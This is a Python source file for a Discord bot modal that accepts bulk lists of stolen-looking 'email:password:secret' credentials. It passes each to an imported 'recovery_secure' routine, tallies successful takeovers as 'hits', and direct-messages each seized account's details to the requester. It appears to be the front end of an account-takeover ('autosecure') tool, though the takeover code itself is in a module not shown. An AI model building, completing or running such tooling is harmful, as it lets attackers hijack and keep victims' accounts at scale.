from discord import ui
import discord

from securing.recovery_secure import recovery_secure
from ui.buttons.account_details import accountInfo

class BulkRecoveryModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Bulk Password + Secret")
        self.add_item(ui.InputText(
            label="Accounts (one per line)",
            style=discord.InputTextStyle.paragraph,
            placeholder="email:password:secret\nemail2:password2:secret2",
            required=True
        ))

    # Recode this part
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        lines = self.children[0].value.strip().splitlines()

        hits = 0
        failures = 0
        failed_emails = []

        processing_embed = discord.Embed(
            title="Processing Bulk Secure",
            description=f"Processing **{len([l for l in lines if l.strip()])}** accounts...",
            color=0x2765F5
        )
        await interaction.followup.send(embed=processing_embed, ephemeral=True)

        for line in lines:
            line = line.strip()
            if not line:
                continue

            parts = line.split(":")
            if len(parts) != 3:
                failures += 1
                failed_emails.append(f"`{line[:30]}...` (invalid format)")
                continue

            email, password, auth_secret = parts[0].strip(), parts[1].strip(), parts[2].strip()

            try:
                account = await recovery_secure(email, "authpwd", {"password": password, "auth_secret": auth_secret})
            except Exception:
                failures += 1
                failed_emails.append(f"`{email}` (exception)")
                continue

            if account == "invalid":
                failures += 1
                failed_emails.append(f"`{email}` (invalid credentials)")
                continue

            if not account:
                failures += 1
                failed_emails.append(f"`{email}` (failed)")
                continue

            hits += 1
            try:
                await interaction.user.send(
                    embed=account["hit_embed"],
                    view=accountInfo(account["details"])
                )
            except discord.Forbidden:
                failed_emails.append(f"`{email}` (DMs disabled)")

        summary_embed = discord.Embed(
            title="Bulk Secure Complete",
            color=0x2765F5
        )
        summary_embed.add_field(name="Processed", value=str(hits + failures), inline=True)
        summary_embed.add_field(name="Hits", value=str(hits), inline=True)
        summary_embed.add_field(name="Failed", value=str(failures), inline=True)

        if failed_emails:
            failed_list = "\n".join(failed_emails[:15])
            if len(failed_emails) > 15:
                failed_list += f"\n...and {len(failed_emails) - 15} more"
            summary_embed.add_field(name="Failed Accounts", value=failed_list, inline=False)

        await interaction.edit_original_response(embed=summary_embed)
